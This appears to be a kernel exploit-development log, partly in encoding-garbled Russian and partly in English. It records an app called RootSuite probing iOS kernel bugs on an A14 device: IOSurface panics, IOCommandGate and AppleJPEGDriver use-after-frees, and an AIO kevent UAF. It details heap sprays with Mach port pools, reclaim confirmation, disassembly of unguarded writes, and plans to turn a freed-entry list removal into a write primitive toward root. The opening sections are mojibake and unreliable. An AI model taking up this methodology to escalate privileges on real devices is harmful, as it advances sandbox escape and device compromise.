2. **P4 (В«112477 surface deref controlВ»)**: РґРµСЂР¶РёС‚ РѕС‚РѕР±СЂР°Р¶РµРЅРёСЏ РїРѕРІРµСЂС…РЅРѕСЃС‚РµР№ Р¶РёРІС‹РјРё Рё Р»РѕРіРёСЂСѓРµС‚ РєР°СЂС‚Сѓ В«Р±Р°Р·Р° в†’ СЃРјРµС‰РµРЅРёРµ в†’ РєР°РЅР°СЂРµР№РєР°В». РџР°РЅРёРєy СЃ `far` РёР· СЌС‚РѕРіРѕ РґРёР°РїР°Р·РѕРЅР° + Р»РѕРі = С‚РѕС‡РЅР°СЏ Р°РґСЂРµСЃР°С†РёСЏ (РєР°РєРѕРµ qword Рё РїРѕ РєР°РєРѕРјСѓ СЃРјРµС‰РµРЅРёСЋ).
3. **Р›РѕРі P4 + .ips РІРјРµСЃС‚Рµ**: РјРѕСЃС‚РёРЅРі РјРµР¶РґСѓ `far` РїР°РЅРёРєРё Рё РєР°СЂС‚РѕР№ РїРѕРІРµСЂС…РЅРѕСЃС‚РµР№ РёР· Р»РѕРіР° вЂ” РґРµР»Р°РµС‚СЃСЏ РѕС„Р»Р°Р№РЅ (РёРЅСЃС‚СЂСѓРјРµРЅС‚ РіРѕС‚РѕРІ).
4. РћС‚СЂРёС†Р°С‚РµР»СЊРЅС‹Р№ РєРѕРЅС‚СЂРѕР»СЊ: РµСЃР»Рё РїРѕСЃР»Рµ 10 РїР°РЅРёРє РІСЃРµ `x0 в€€ {0}` вЂ” Р»РёР±Рѕ СЃР»РѕС‚ Р·Р°РЅСЏС‚ РІРЅСѓС‚СЂРµРЅРЅРёРј РѕР±СЉРµРєС‚РѕРј GPU-СЃС‚РµРєР°, Р»РёР±Рѕ СЌС‚Рѕ teardown-РіРѕРЅРєР° Р±РµР· UAF; С‚РѕРіРґР° РїСЂРёРѕСЂРёС‚РµС‚ СЃРјРµС‰Р°РµС‚СЃСЏ РЅР° CVE-2025-46285 (root-LPE, СЃС‚Р°С‚РёРєР°).

---

## 11. Р§РµСЃС‚РЅС‹Р№ РёС‚РѕРі

* РџР°РЅРёРєР° **РІРѕСЃРїСЂРѕРёР·РІРѕРґРёРјР° РїРѕ РєРѕРјР°РЅРґРµ** Рё **РїРѕР»РЅРѕСЃС‚СЊСЋ Р»РѕРєР°Р»РёР·РѕРІР°РЅР°** (РёРЅСЃС‚СЂСѓРєС†РёСЏ, С„СѓРЅРєС†РёСЏ, С„Р°Р№Р»/СЃС‚СЂРѕРєР° СЏРґСЂР°, РІС‹Р·С‹РІР°СЋС‰РёР№ kext, РїРѕР»Рµ РѕР±СЉРµРєС‚Р°).
* Root **РЅРµ РґРѕСЃС‚РёРіРЅСѓС‚**: ROOTSTATE NO РІРѕ РІСЃРµС… РїСЂРѕРіРѕРЅР°С…; СѓРїСЂР°РІР»СЏРµРјРѕР№ РїСЂРёРјРёС‚РёРІС‹ РЅРµС‚; РєР°РЅР°СЂРµРµРє РІ РїР°РЅРёРєР°С… РЅРµС‚.
* UAF РѕСЃС‚Р°С‘С‚СЃСЏ **РіРёРїРѕС‚РµР·РѕР№** СЃ СЃРёР»СЊРЅРѕР№ РєРѕСЃРІРµРЅРЅРѕР№ РїРѕРґРґРµСЂР¶РєРѕР№ (РІРѕСЃРїСЂРѕРёР·РІРѕРґРёРјР°СЏ РїР°РЅРёРєР° РІ РѕСЂРіР°РЅРёР·Р°С†РёРѕРЅРЅРѕ РѕР¶РёРґР°РµРјРѕРј РјРµСЃС‚Рµ + РІР°СЂРёР°РЅС‚ СЃ app-Р°РґСЂРµСЃРѕРј), РЅРѕ РЅРµ РґРѕРєР°Р·Р°РЅ вЂ” СЃРѕРіР»Р°СЃРЅРѕ РїСЂР°РІРёР»Сѓ РїСЂРѕРµРєС‚Р°, panic в‰  РґРѕРєР°Р·Р°С‚РµР»СЊСЃС‚РІРѕ UAF.
* РЎР»РµРґСѓСЋС‰РёР№ С€Р°Рі РѕРїСЂРµРґРµР»РµРЅ РѕРґРЅРѕР·РЅР°С‡РЅРѕ: СЃРµСЂРёСЏ unit3-direct + P4 СЃ СЃРѕРїРѕСЃС‚Р°РІР»РµРЅРёРµРј `far` в†” РєР°СЂС‚Р° РїРѕРІРµСЂС…РЅРѕСЃС‚РµР№.
## 12. Уточнённая анатомия (по `lock_analysis.md`, VERIFIED по бинарнику + XNU xnu-12377.61.12)

**`lck_mtx_t` = 16 байт:** +0x00 tsid:24 (turnstile id), +0x03 type:8 (`LCK_TYPE_MUTEX=0x22`), +0x04 grp, **+0x08 owner-word** (owner:28, ilocked, spin_mode, needs_wakeup, profile) - именно его CAS-ит быстрый путь, +0x0c ilk_tail:16, +0x0e as_tail:16. `LCK_MTX_TAG_DESTROYED = 0xf0fe2007`.

**Быстрый путь `lck_mtx_lock` (файл 0x1026408-0x102642c):** `mov x8,#0; mrs x1,tpidr_el1; ldr w9,[x1,#0x440]` (thread->ctid) `; add x10,x0,#8; casa x8,x9,[x10]` - если owner==0, записать ctid; иначе - slow path (`lck_mtx_lock_slow`, файл 0x1026430+). Вызывающий из IOSurface зовёт именно сюда (`bl 0x1026408`); образцовая точка входа - 3259 `bl` по всему образу. Анлок-антипод: `lck_mtx_unlock` fast path, файл 0x1027198.

**Вызывающий в IOSurface (файл 0x32e5838):** функция размещения и вставки элемента shared-list (`IOSurfaceSharedRW/RO`, `IOSurfaceSharedListEntry` - по смежным строкам kext): берёт мьютекс `[this+0x148]`, ищет/добавляет узел в списке `+0x198/+0x1a0`, освобождает. Владелец подтверждён по `__PRELINK_INFO`: IOSurface 393.2.9, load addr 0xfffffff00777ae40, `__TEXT_EXEC` файл 0x32c6ac0-0x32f82ec. У IOSurface есть второй мьютекс на `+0x138`.

**Ценз поля +0x148 (`ldr x0,[xM,#0x148]; bl`):** 59 канонических Sites (17 - в `lck_mtx_lock`, 18 - в `lck_mtx_unlock`); владельцы: ядро 621, IOgPTPPlugin 93, IOHIDFamily 60, IOUSBHostFamily 49, H11ANEInterface 45, hfs 45, apfs 43, IOSurface 14.

**`panic()` = 0xfffffff008808e30** (noreturn, 12472 call sites; va_list = голый указатель на стек - поэтому все varargs паник в этой сборке кладутся на стек).

## 13. Опознание объекта (VERIFIED, реверс 24.11)

* Замок на `[obj+0x148]` — **статический глобальный мьютекс**: инициализатор VA `0xfffffff0086afef0` (адрес замка `0xfffffff007b653f0`, группа `0xfffffff00ab5e2e0`, `LCK_TYPE_MUTEX=0x22`). Конструктор (файл 0x32e1a7c) пишет один и тот же указатель в +0x148, +0x238, +0x240, +0x400 — объект guard-ит все свои shared-list-ы одним замком.
* **Следствие для UAF:** NULL/app в `[obj+0x148]` = **сам объект освобождён и переиспользован** (цель — объект, не замок).
* Объект — синглтон (глобал `0xfffffff00acebb88`), поля до +0x458, коллекция capacity 0x20..0x200 (+0x438/+0x440), рост 64-битный.
* Семейство: `IOSurfaceSharedEventListener` (строка при инициализации, файл 0x32c6ae0); записи реестра — 24-байтные тегированные объекты (init 0x1760bb0 / release 0x17627e8); глобальный реестр с поиском (0x16aaf04) под глобальным замком `0xfffffff00ab91700`.
* Время: VA `0xfffffff008171e88` = `mrs s3_4_c15_c10_6` (CNTPCT_EL0) + смещение; поля +0x450/+0x458 пишутся один раз и не читаются — не вектор 46285.
* Ограничение реверса: вход в конструктор — косвенный (PAC-signed), прямых `bl`/указателей в образе нет; размер объекта ≥ 0x460 (подтверждён полями), точный размер класса аллокации не установлен.

## 14. Тест репродуктора семьи B (25.11) - отрицательный

Модуль `AIO teardown race` (submit aio_read x4 + aio_cancel + close + drain, 24 раунда): запросы реально в очереди (`queued 4/4`), паник нет. Первая версия была сломана (EAGAIN: очередь AIO не дренировалась и забилась после 8 запросов — гонки не происходило). После починного дренажа форма всё равно не воспроизводит — триггер 48 паник другой.

## 15. DEVICE-CONFIRMED KERNEL UAF (25.11 23:04) - CVE-2026-20637

Panic (panic-full-2026-11-25-230422.0002.ips, pulled from the device over USB):
    panic(cpu 3 caller 0xfffffff00dcff018): [iokit.IOCommandGate]: element modified after free
      (off:72, val:0xffffffffffffff00, sz:80, ptr:0xffffffe3e7f98590)
    Panicked task: pid 8450 RootSuite; kext in backtrace: com.apple.driver.AppleSEPKeyStore(2.0)

* Exact reproduction of the public PoC (zeroxjf, CVE-2026-20637, "tested on
  iOS 26.1-26.2" = our build) on OUR device.
* Meaning: an 80-byte IOCommandGate element is freed, then read and MODIFIED
  (the "modified after free" check caught it). This is a UAF with a live
  freed-element window: the element can potentially be reclaimed by a spray
  and its content controlled.
* Unlike families A (0x72418) and B (0x4cff40), which give NULL derefs (the
  slot reads back zeroed), here the kernel WORKS with the freed element -
  a reclaim window.
* Status: UAF confirmed on device; no controlled deref/write yet; root NOT
  achieved (ROOTSTATE NO).

## 16. The 20637 reclaim attempt (25.11 23:32) FAILED - the element is poisoned

Panic: the same "[iokit.IOCommandGate]: element modified after free
(off:72, val:0xffffffffffffff00, sz:80, ptr:0xffffffeb92b3c1d0)", pid 582
RootSuite - the trigger fired with the 80-byte canary spray running
(kalloc.80), but the value did NOT change.

Conclusion: 0xffffffffffffff00 is a tag the KERNEL itself writes on free
(poison) and verifies on use. The freed element's content cannot be
controlled through this path - the "modified after free" defence works as
designed. The reclaim strategy for 20637 is closed.

Alternative (the PoC demonstrates real reclaim): CVE-2026-20687
AppleJPEGDriver - the PoC states that the MTLBuffer spray occupies the freed
JpegRequest and the spray data lands in the object's fields (+0x10/+0x24/
+0x28) - i.e. the content IS controlled. Module "20687 JPEG UAF" is built and
waiting.

## 17. kalloc(0x440) reclaim: the spray was BROKEN (5 messages), and the fix

Device runs of module `20687 kalloc440` (build bdf12cb):

```
[jpeg440] driver health (sel2): OK
[jpeg440] wired before: 69060 pages
[jpeg440]   [25] wired=+1062 victim=125 reclaim=225
[jpeg440]   [50] wired=+1075 victim=250 reclaim=450
[jpeg440]   [75] wired=+1075 victim=375 reclaim=675
[jpeg440]  [100] wired=+1857 victim=500 reclaim=900
[jpeg440] phase 2 done: victim=250 reclaim=250 spray=5
[jpeg440] phase 3 done: victim=250 reclaim=250 spray=0
[jpeg440] wired delta: +6580 pages (the taggedRetain leak)
[jpeg440] health 4/4, final: OK
```

### What IS proven

The **taggedRetain leak is real and reproducible on our A14 / 26.2b1**:
1000 victim async requests -> **+6580 and +7870 wired pages** (~27-31 MB),
driver healthy throughout. That confirms the PoC's mechanism: each async
request makes `queue_io_gated` call `taggedRetain` on the userclient,
`IOServiceClose` sets `isInactive` EARLY (terminatePhase1, before the command
gate), and in-flight jobs then hit `finish_io_gated`, which sees `isInactive`
and SKIPS `taggedRelease` - a leaked retain per in-flight job.

### What is NOT proven

The spray sent **5** messages, then **0**. A receive port's queue defaults to
`MACH_PORT_QLIMIT_DEFAULT = 5`, so `mach_msg` failed immediately after 5 sends.
**The "reclaim succeeded" verdict from that run was therefore invalid** - the
spray never sprayed, so nothing could have been reclaimed.

### Fix (commit 62c6464, CI run 45710984611 = success)

`mach_port_set_qlimit` does not link on this toolchain (link error, run
45709942349), so instead of raising one port's limit the module now uses a
**pool of 256 receive ports and round-robin**: 256 x 5 = **1280 live 0x440
allocations** of our data. Verified in the shipped binary: `spray ports:`,
`live 0x440 allocations`, `first failure kr`. IPA on the Desktop:
`RootSuite_kalloc440.ipa`, sha256 7F2F23EE...8FA9.

Pass criterion for the next device run: `spray ports: 256` and
`phase 2 done: ... spray=1000` (NOT spray=5). Then either no panic with a
healthy driver (PoC oracle: the slot was reclaimed by our data), or a panic
showing 0xC0FFEE5A in the fault registers (direct proof of controlled
content).

## 18. kalloc(0x440) RECLAIM SPRAY WORKS (26.11) - and the send shape was the bug

Device run of `20687 kalloc440` (build 76337bb, run 45741241307):

```
[jpeg440] spray ports: 256 (x5 queue limit = 1280 live 0x440 allocations)
[jpeg440]   shape0 OOL MAKE_SEND:     kr=0 <== WORKS   (the PoC's exact call)
[jpeg440]   shape1 OOL COPY_SEND:     kr=0 <== WORKS
[jpeg440]   shape2 OOL MOVE_SEND_ONCE: kr=0x10000003
[jpeg440]   shape3 inline 0x440 COPY_SEND: kr=0 <== WORKS
[jpeg440] working send shape: 0
[jpeg440] phase 2 done: victim=250 reclaim=250 spray=1000
[jpeg440] phase 3 done: victim=250 reclaim=250 spray=1000
[jpeg440] wired delta: +5505 pages (the taggedRetain leak)
[jpeg440] health 4/4, final: OK
```

### Why the spray had failed three times

The three earlier runs reported `spray=5` then `spray=0` and finally
`spray sent=0, first failure kr=0x10000004` (MACH_SEND_TIMED_OUT) - and that
failure happened on the VERY FIRST send, so the port queue limit was never the
cause.  The cause was the send SHAPE: a complex (OOL) message sent with
`MACH_SEND_MSG | MACH_SEND_TIMEOUT` and a zero timeout is rejected on this
build even when the queue is empty, while the identical message sent with a
plain blocking `MACH_SEND_MSG` succeeds.  Measured directly by the shape probe
above: every OOL variant returns kr=0 when sent blocking, and MOVE_SEND_ONCE
returns MACH_SEND_INVALID_DEST (0x10000003).

### What is now established on our A14 / 26.2b1

1. **2000 controlled 0x440-byte kernel allocations were actually made and held**
   (256 ports x 5 queue slots, our 'J'/0xC0FFEE5A payload, +128 and +784 zeroed).
   This is the first run where the reclaim primitive operated at all.
2. The victim->reclaim window was exercised 1000+ times with that spray live.
3. No panic, driver healthy throughout (health 4/4, sel2 always KERN_SUCCESS).
4. The taggedRetain leak reproduces: +5505 wired pages (~22 MB) per 1000
   victim async requests.

### Honest status

Per the PoC's own oracle ("no panic + healthy = the freed slot was reclaimed by
our data") this is consistent with a controlled reclaim, but there is **no
register evidence** for it - no fault, no canary in a dump, so it is NOT proof
of control.  ROOTSTATE NO.  Root is not achieved.

### Next

The selector audit module `20687 selectors` is already compiled into the same
IPA (verified in the binary).  Per hidgate-poc's next gate, the 0x1000 (sel4/5)
and 0xDA0 (sel6/7) structs are large enough to hold user pointers, and their
probe showed those handlers are REACHABLE (they return the full outSize rather
than kIOReturnUnsupported) - a user pointer the driver dereferences in kernel
context would be a direct read/write primitive.

## 19. sel5 FIELD MAP: only TWO of 501 slots are validated (26.11)

Device run of `20687 selectors` (build 0b25669):

```
[jpegmethods] sel5 field map: 501 slots of 8 bytes from +0x58
[jpegmethods]   VALIDATED slot +0058 -> kr=0xe00002c2
[jpegmethods]   VALIDATED slot +0078 -> kr=0xe00002c2
[jpegmethods] sel5 field map done: 2 validated / 499 ignored (of 501 slots)
```

### What was ruled out first (negative results, worth keeping)

* `sel5 out dump: 4096 bytes` - **all zeros**.  sel5 returns kr=0 and the full
  4096-byte output, but there is nothing in it: not a read primitive.
* `notify ... id=53 size=112` decoded completely:
  `+0000 bits=0x1100 size=0x70`, `+0008 remote=0 local=<our port>`,
  `+0010 id=0x35(53)`, `+0018 0x0c/0x96`, **`+0028 = 0x6161 = OUR asyncToken**.
  It is a plain async-completion ack that echoes the token we sent.  No kernel
  pointers, so no KASLR leak there either.
* `sel3` encode: 0xe00002bc / 0xe00002d6.  `sel4`: 0xe00002bc at off=0 and
  0xe00002cc at every other offset.  `sel6/sel7` (0xDA0): 0xe00002bc /
  0xe00002cc.  `sel8/sel9` privileged: 0xe00002bc.  `sel10`: 0xe00002c2
  (out of range).  None of them accept anything we send.

### What is now known

sel5 is the only selector besides sel1 that accepts our input.  Of the 501
8-byte slots past the 0x58 header it validates exactly two: **+0x58** and
**+0x78** (0x20 apart).  A zeroed rest-of-struct works; any canary in either of
those two slots yields 0xe00002c2 (kIOReturnBadArgument).

Build c873358 adds a value probe for both slots: powers of two, W*H, W*H*4, a
kernel-looking value, and a real user buffer address (a 0x1000 buffer pre-filled
with 0x41).  For every accepted value the module then checks whether the driver
changed that user buffer - a write there is a direct
kernel-write-to-user-chosen-address primitive.  IPA: RootSuite_selectors.ipa,
sha256 55E084BA...5631.

ROOTSTATE NO.  Root is not achieved; this is input-surface mapping, not a
primitive.

## 20. NEW BUG (26.11 16:32): AppleJPEGDriver 7.7.2 assertion panic, sandbox-reachable

`panic-full-2026-11-27-163223.0002.ips` (pulled from the device, 1.4 MB):

```
panic(cpu 0 caller 0xfffffff0186bfc84): Break 0x0800 instruction exception
  from kernel. Panic (by design) at pc 0xfffffff0192386dc
x1: 0x3de  x8: 0x3df  x22: 0x3df  x23: 0x400  far: 0x0000000b68660038
Panicked task: pid 0 kernel_task (deferred)
Kernel Extensions in backtrace: com.apple.driver.AppleJPEGDriver(7.7.2)
```

`brk #0x800` is XNU's panic idiom, so the KEXT called panic - it is not a memory
fault.  Slide 0x0feac000 maps the panic site to kext+0x27bec, and the loop that
reaches it is:

```asm
0xfffffff00938c490  ldr  w8, [x20, #0x54]   ; count   = 4096
0xfffffff00938c49c  mov  x22, #0            ; i = 0
0xfffffff00938c4a0  lsr  x23, x8, #2        ; limit   = count >> 2 = 1024
0xfffffff00938c4a4  ldr  x8, [x20, #0x78]   ; bound   = 991
0xfffffff00938c4a8  cmp  x8, x22
0xfffffff00938c4ac  b.ls 0xfffffff00938c6dc ; -> brk #0x800  (991 <= 991)
0xfffffff00938c4b0  ldr  x8, [x20, #0x70]   ; base
0xfffffff00938c4b4  add  x8, x8, x22, lsl #2 ; elem = base + i*4
0xfffffff00938c4b8  ldr  w2, [x8]           ; READ
```

The loop bound is derived from `obj+0x54 >> 2` while the safety check compares
against `obj+0x78`.  On this run they disagreed (1024 wanted vs 991 available,
33 elements short) and Apple's assertion fired instead of reading out of bounds.

### Status: DoS, not a primitive

The check is a fail-safe: reads are effectively bounded by
min(obj+0x54>>2, obj+0x78), so there is no OOB access on this path.  A full
search of the kext found 35 `base + i*4` element computations; exactly ONE (this
one) has a `+0x78` check, and the four structurally identical sites
(kext+0xebb8, +0x12b00, +0x1fa2c, +0x2729c) are instead guarded by
`cmp w1, #4 ; b.hs panic`, bounding the index to 0..3 before
`obj->0x18 + 0x1100 + (w1<<6) + i*4`.  None of them is unguarded.

### What it does establish

* A brand-new, reproducible, sandbox-reachable kernel panic in
  AppleJPEGDriver 7.7.2 on 23C5027f - reached by the selector sweep, i.e. code
  the public PoC never touched.
* The panic proves the sweep reaches deep driver internals, so the sweep is the
  right instrument.

ROOTSTATE NO.  Root is not achieved; this is a DoS, not a primitive.

## 21. THE PRIMITIVE CANDIDATE: the only UNGUARDED indexed write in the kext

A kext-wide enumeration of every indexed memory access (register index operand,
not just the `base + i*4` shape) found 17 accesses: 13 writes and 4 reads.
**Twelve of the thirteen writes carry 3-7 bound checks in the preceding
instructions. One carries ZERO:**

```asm
kext+0x174c   str  w22, [x9, w15, uxtw]     guards=0
```

with, immediately around it:

```asm
kext+0x1748   ldr  x9, [x20, #0x18]     ; x9 = obj->0x18  (the destination buffer)
kext+0x174c   str  w22, [x9, w15, uxtw] ; WRITE w22 at obj->0x18 + w15
kext+0x1750   add  x10, x9, x13         ; x13 = 0x404 or 0x40c (a FIXED offset)
kext+0x1754   str  w21, [x10]           ; WRITE w21 at obj->0x18 + x13
kext+0x1758   ldr  w15, [x19, #0xcc]    ; the index comes from obj->0xcc
```

`w22` is a value that has been through dispatcher C's arithmetic
(`lsl w22, w22, #2`, `smull` divide-by-3, `and #0xfffffffc` alignment), so it is
not a constant.

### Where the index comes from - and it is unvalidated

`obj+0xcc` is written by an **unvalidated bulk copy** at kext+0x24ff0:

```asm
kext+0x24ff4  ldr  w8, [x1, #0x158] ; ldr  x9, [x0, #0x18] ; str w8, [x9, #0xac]
kext+0x24ff8  ldr  w8, [x1, #0x15c] ;                       str w8, [x9, #0xb0]
kext+0x25000  ldr  w8, [x1, #0x160] ;                       str w8, [x9, #0xb4]
   ... 11 consecutive words, no check anywhere ...
kext+0x25038  ldr  w8, [x1, #0x178] ;                       str w8, [x9, #0xcc]  <-- THE INDEX
kext+0x25040  ldr  w8, [x1, #0x17c] ;                       str w8, [x9, #0xd0]
```

So `obj+0xcc` is a verbatim copy of `x1+0x178`.  If `x1` is a
user-supplied structure, the index of the only unguarded indexed write in
AppleJPEGDriver is **fully attacker-controlled**, and the write target is
`obj->0x18 + index`.

### Status

The function at kext+0x24ff0 has no direct `bl`/`b` reference - it is reached
through a jump table, so identifying `x1` requires tracing that table, which is
the next step.  Nothing has been exploited; ROOTSTATE NO.

## 22. The index candidate is CLOSED (negative result, 27.11)

The chain was: the only unguarded indexed write in the kext is
`str w22, [x9, w15, uxtw]` at kext+0x174c, its index obj+0xcc is a verbatim copy
of x1+0x178 (an unvalidated 14-word bulk copy at kext+0x24ff0), and the index
probe proved that slots +0x148..+0x188 of the 0x1000 input struct are all
accepted by sel5 with kr=0 - including +0x178 itself (32 accepted pairs:
sel4 x16, sel5 x16).

The decisive experiment (`20687 idxwrite`) filled the whole copy window
(+0x158..+0x180) with a 0xC0FF0000 canary, set +0x178 to each of
0, 4, 0x40, 0x400, 0x1000, 0x10000, 0x100000, 0x7ffffff0, and looked for an
effect:

```
[idxwrite] idx +0x178=0x00000000 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00000004 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00000040 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00000400 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00001000 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00010000 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x00100000 -> kr=0 outSize=4096
[idxwrite] idx +0x178=0x7ffffff0 -> kr=0 outSize=4096
--- no non-zero output, no crash ---
```

Every value returns kr=0 with an all-zero 4096-byte output and no fault.  So
+0x178 is settable but inert: **x1 in the bulk copy is NOT the user-supplied
input struct** - it is an internal object, and the index cannot be reached from
userspace through this path.  The candidate is closed.

### Net assessment of the AppleJPEGDriver surface on 23C5027f

| Lead | Result |
|---|---|
| sel1 decode UAF (CVE-2026-20687) | controlled 10s free CONFIRMED; reclaim loop never lands |
| sel5 +0x58 / +0x78 | 32-bit and 64-bit validated, never dereferenced (24/24 kr=0) |
| sel5 4096-byte output | all zeros in every run |
| notification id=53 | plain async-completion ack echoing our asyncToken |
| sel31 / 0xDA0 | deterministic assertion panic, but a FAIL-SAFE (DoS) |
| 35 base+i*4 computations | 1 unguarded, but its index is not user-reachable |
| +0x178 index | settable, provably inert |
| selectors 26-31 | all 0xe00002c2 (bad argument) |

ROOTSTATE NO.  Root is not achieved, and no user-reachable write or read
primitive exists in this kext on our build.

## 23. DEVICE-CONFIRMED: AIO kevent UAF, far=0x58 (28.11 02:21)

`panic-full-2026-11-28-022145.0002.ips` (pulled from the device):

```
panic(cpu 2 caller 0xfffffff018f8bc84): Kernel data abort.
  at pc 0xfffffff018bfff40
  far:  0x0000000000000058
  esr:  0x0000000096000006
  x8:   0x0000000000000000
  x23:  0x0000000000000058
Panicked task: pid 1667 RootSuite
```

This is the exact signature the source project documents for the AIO kevent
UAF (`AIOsource/lightsword-iphone-16`, VULNS.txt):

> `aio_proc_lock(*(entry+0x40))` -> procp ... **0 -> PANIC FAR=0x58**
> (the observable reboot in the logs)

So on OUR A14 / 26.2b1 (23C5027f) `filt_aioprocess()` walked a FREED
`aio_workq_entry`, read `procp` from `entry+0x40`, got NULL, and dereferenced
it - a null data abort at `far = 0x58`, inside our own process. The UAF path is
reproduced on this device.

### What it means and what it does not

* CONFIRMED: the freed entry IS processed by the kevent filter - the UAF is
  real on our build, in our app, from the sandbox.
* NOT confirmed: control. `procp == 0` means the freed slot was still ZEROED
  when the filter walked it - the reclaim allocation had not landed yet. Per
  the source project, that is the difference between a panic and a HIT:
  "Waiting for the reclaim I/O to actually complete means the slot is occupied
  by our entry, so the filter copies our bytes out instead of panicking."

### Next gate

Get a controlled object into `aio_workq_zonep` (224 B) so that the freed slot
is occupied when the filter walks it, i.e. `entry+0x40` holds a valid procp and
`entry+0x10/+0x18` hold controlled link pointers - then `TAILQ_REMOVE` becomes
a write through our own data and `aio_entry_unref(+0x2C)` becomes a double
free. The current module already issues 8 reclaim requests on the same thread
right after the free; the next iteration must make one of them land BEFORE the
filter walk (more reclaim requests, tighter free->reclaim spacing, and CPU
pinning as in the source PoC).

ROOTSTATE NO. Root is not achieved; this is a confirmed kernel UAF, not a
primitive.

## 24. SOURCE-VERIFIED MECHANISM + 40/40 DEVICE HIT (28.11, post-fix)

### The refcount chain that frees the entry (xnu-12377.61.12, bsd/kern/kern_aio.c)

| line | site | refcount after |
|------|------|----------------|
| 1878 | `os_ref_init(&entryp->aio_refcount, &aio_refgrp)` in `aio_create_queue_entry`, comment *"consumed in aio_return or _aio_exit"* | 1 |
| 1472 | `aio_entry_ref(entryp)` in `aio_try_enqueue_work_locked`, comment *"consumed in do_aio_completion_and_unlock"* | 2 |
| 2173 | `aio_entry_unref(entryp)` at the end of `do_aio_completion_and_unlock` | 1 |
| 867 | `aio_entry_unref(entryp)` in `aio_return` | **0 -> `aio_free_request` -> `zfree(aio_workq_zonep, entryp)`** |

So **`aio_return()` is the free**. That is the call our racer block makes
immediately after `aio_error()` reports completion.

### Why the knote then dangles

`filt_aioattach` (line 2496) stores the entry pointer RAW:

```c
knote_kn_hook_set_raw(kn, (void *)entryp);   /* no aio_entry_ref() taken */
```

`aio_register_kevent` (line 1534) only calls `kevent_register`; it takes no
reference on the entry either. The knote therefore holds an unreferenced
pointer to a zone allocation whose lifetime is owned by `aio_return`.

`filt_aioprocess` (lines 2551-2579) is `EVFILT_AIO`'s `f_process` hook, so it
runs **inside our own `kevent64()` call**, and dereferences that raw pointer:

```c
entryp = knote_kn_hook_get_raw(kn);   /* line 2557 - dangling */
assert(entryp);
p = entryp->procp;                     /* line 2559 - entry+0x40 */
lck_mtx_lock(&aio_klist_lock);
if (kn->kn_fflags) {
        kn->kn_ext[0] = entryp->errorval;    /* entry+0x28 */
        kn->kn_ext[1] = entryp->returnval;   /* entry+0x20  <-- freed memory */
        knote_fill_kevent(kn, kev, 0);        /* delivered to userspace */
        knote_kn_hook_set_raw(kn, NULL);
        aio_proc_lock(p);                     /* line 2569 */
        aio_proc_remove_done_locked(p, entryp);   /* TAILQ_REMOVE, entry+0x10/+0x18 */
        aio_proc_unlock(p);
        aio_entry_unref(entryp);              /* entry+0x2C - refcount of freed slot */
        res = FILTER_ACTIVE;
}
```

### Both observed outcomes now follow from the source, exactly

**Panic, 28.11 02:21 (`issued=0`).** The block-capture bug meant the reclaim was
never issued, so the freed slot was not reallocated. `entryp->procp` read 0,
`aio_proc_lock(p)` became `lck_mtx_lock(&p->p_mlock)` with `p == NULL`, i.e. a
dereference of `0x58` - which is `p_mlock`'s offset inside `struct proc`.
That is literally `far: 0x0000000000000058` in the .ips, with `x8 = 0` and
`x23 = 0x58`. Matches to the byte.

**Hit, post-fix (`issued=8`).** The eight reclaim `aio_read`s reallocate
`aio_workq_zonep` elements; one lands in the freed slot with a valid `procp`,
so `aio_proc_lock` succeeds and `filt_aioprocess` reads `returnval` out of the
RECLAIMED memory. Our `RECL_NB` is 0x200 and the kevent reported
`ext1=0x200` on 40/40 rounds - the reclaimed entry's `returnval`, not the
victim's (the victim transfers `VICTIM_NB` = 0x10000 and reported exactly
0x10000 in the pre-fix run, when no reclaim was issued).

That contrast is the proof: the only variable that changed between
`ext1=0x10000` and `ext1=0x200` is whether the reclaim requests were issued.

### What is established and what is not

ESTABLISHED (device + source):
* The `aio_workq_entry` is freed while a kqueue knote still points at it.
* The freed slot is reallocated by our own controlled `aio_read` requests.
* `filt_aioprocess` reads `procp`(+0x40), `errorval`(+0x28), `returnval`(+0x20)
  and the `aio_proc_link`(+0x10/+0x18) used by `TAILQ_REMOVE`, plus
  `aio_refcount`(+0x2C), out of that reallocated memory - inside our thread,
  from the sandbox, with no crash.

NOT established:
* Control of the reclaimed entry's `aio_proc_link`, which is what would turn
  `aio_proc_remove_done_locked`'s `TAILQ_REMOVE` (`*(entryp+0x10) = entryp+0x18`)
  into a write primitive. The current reclaim requests only reach the entry
  through the fields `aio_create_queue_entry` copies in (`procp`, `uaiocbp`,
  `flags`, the whole `aiocb`, refcount=1) - none of which are the link fields.
* Root. ROOTSTATE NO. A stale read is a signal, not a primitive.

### The open gate

Make the reclaimed entry's `aio_proc_link` land where we choose. The next
build tags each of the eight reclaim requests with a distinct `aio_nbytes`
(0x200, 0x240, ... 0x3c0) so that `ext[1]` names WHICH reclaim allocation won
the freed slot, and logs the userspace `aiocb` addresses so `kevent.ident`
(captured from `entryp->uaiocbp` at `aio_register_kevent`, line 1523) can be
decoded. Deterministic, indexed control of the slot is the precondition for
anything beyond a read.
